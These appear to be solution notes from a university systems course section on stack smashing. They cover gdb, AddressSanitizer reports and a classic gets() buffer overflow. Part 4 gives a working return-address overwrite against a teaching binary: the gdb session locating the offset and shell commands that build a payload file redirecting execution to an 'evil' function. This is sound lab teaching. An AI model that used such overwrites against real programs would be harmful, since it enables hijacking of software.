CS 61 Section 3: Stack smashing
===============================

This section material can be completed in section in flipped-classroom style,
or on your own.

[https://cs61.seas.harvard.edu/wiki/2017/Section3](Instructions)


Skills
------
* Learn how to use tools like gdb (GNU Debugger).
* Extract instructions from memory.
* Learn about simple cyber attacks.


Solution notes
--------------
The solutions depend intimately on the decisions the compiler makes
about memory layout, not all of which are standardized. We compiled
our solutions with clang version 3.8.0-2ubuntu4 on an x86-64 Linux
machine.

Parts 1 and 2 are documented in `factorial.c`.

StackSmash (Part 3)
-------------------
Here's what we observed for StackSmash (Part 3). (Sadly, the initial
section release did not compile `stacksmash.safe` with SANITIZE=1,
so you may have observed something different.)

* `./stacksmash < y120.txt` prints `Read 120 character(s)`, then
  dies with a segmentation fault. Using gdb, we see the fault occurs
  in `__libc_start_main`, after `main` returns.

* `./stacksmash.safe < y120.txt` dies with a sanitization error:
  ‘AddressSanitizer: stack-buffer-overflow on ...’. It dies *before*
  printing the number of characters read! We can use gdb to investigate
  further. I googled “breakpoint address sanitizer” and found
  [this page](https://github.com/google/sanitizers/wiki/AddressSanitizerAndDebugger),
  which says “If you want gdb to stop after asan has reported an error,
  set a breakpoint on `__sanitizer::Die` or use
  `ASAN_OPTIONS=abort_on_error=1`.” Setting that breakpoint, we see
  the following backtrace:
```
#0  0x00000000004c8760 in __sanitizer::Die() ()
#1  0x00000000004be30b in __asan::ReportGenericError(unsigned long, unsigned long, unsigned long, unsigned long, bool, unsigned long, unsigned int, bool) [clone .part.18] ()
#2  0x00000000004361ae in __interceptor_strlen.part.45 ()
#3  0x00000000004e9d13 in main () at stacksmash.c:9
```
  It looks like the sanitizer has intercepted the call to `strlen`
  and used it to detect the stack buffer overflow.

* `./stacksmash < y100.txt` and `./stacksmash < y119.txt` both
  appear to run fine. But the sanitized versions report bugs each
  time! The sanitizer caught a dangerous undefined behavior (the stack
  buffer overflow) that did not cause a crash. Good for the sanitizer!

  Note that `y100.txt` causes a stack buffer overflow even though
  the buffer is 100 bytes big. This is because the null character
  added to terminate the string lies outside the buffer.

* `./stacksmash < y99.txt` and `./stacksmash.safe < y99.txt` run fine.


AttackMe (Part 4)
-----------------
The `attackme` program links with the `evil.o` object. Interesting!
`nm evil.o` reports a single function, `evil`:
```
$ nm evil.o
                 U environ
0000000000000000 T evil
0000000000000000 r my_argv
```
We can tell it’s a function because it’s in the `T`ext segement, which
is the segment used for function instructions. Maybe we can use a
stack buffer overflow (as in Part 3) to overwrite the return address
(as in Part 2) to call `evil()`!

`nm attackme` will report the address of `evil` in our compiled
executable:
```
$ nm attackme | grep evil
0000000000400750 T evil
```

`attackme()` calls the unsafe `gets()` function. If we set a breakpoint
in `gdb attackme` at `read_line`, we can find the offset between the
start of the `buffer` and the `read_line` function’s return address.
```
$ gdb attackme
...
(gdb) b read_line
Breakpoint 1 at 0x4006cc: file attackme.c, line 8.
(gdb) r < /dev/null
Starting program: /home/kohler/cs61-sections/s03/attackme < /dev/null

Breakpoint 1, read_line () at attackme.c:8
8	    return gets(buffer);

(gdb) bt
#0  read_line () at attackme.c:8
#1  0x00000000004006f4 in main () at attackme.c:12
(gdb) # The return address, which `bt` says is 0x4006f4,
      # is located in this function’s stack frame after `buffer`.
      # We print 20 8-byte words starting at `buffer + 96`.
      x/20g buffer + 96
0x7fffffffddc0:	0x0000000000000001	0x0000000000400a7d
0x7fffffffddd0:	0x00007fffffffde00	0x00000000004006f4 #*****
0x7fffffffdde0:	0x0000000000400a30	0x00000000004005c0
0x7fffffffddf0:	0x00007fffffffdee0	0x0000000000000000
0x7fffffffde00:	0x0000000000400a30	0x00007ffff7a2d830
0x7fffffffde10:	0x0000000000000000	0x00007fffffffdee8
0x7fffffffde20:	0x00000001f7ffcca0	0x00000000004006e0
0x7fffffffde30:	0x0000000000000000	0xcef8f8e61669c1db
0x7fffffffde40:	0x00000000004005c0	0x00007fffffffdee0
0x7fffffffde50:	0x0000000000000000	0x0000000000000000
(gdb) # Looks like it’s at 0x7fffffffddd8. Verify:
      x/g 0x7fffffffddd8
0x7fffffffddd8:	0x00000000004006f4
(gdb) p (const char*) 0x7fffffffdd8 - buffer
$1 = 120
(gdb) # The return address is 120 bytes after the start of the buffer.
      q
```

Now we construct a file that consists of 120 characters, and then the
return address we want (0x400750, the address of `evil`). You could
write a program to construct this file; we use some Unix utilities.
```
$ yes | tr -d '\n' | head -c 120 > evil.txt
$ printf "\x50\x07\x40\x00\x00\x00\x00\x00" >> evil.txt
```

After this, running `./attackme < evil.txt` gives a nasty surprise!

`unattackable.c` has our unattackable version.
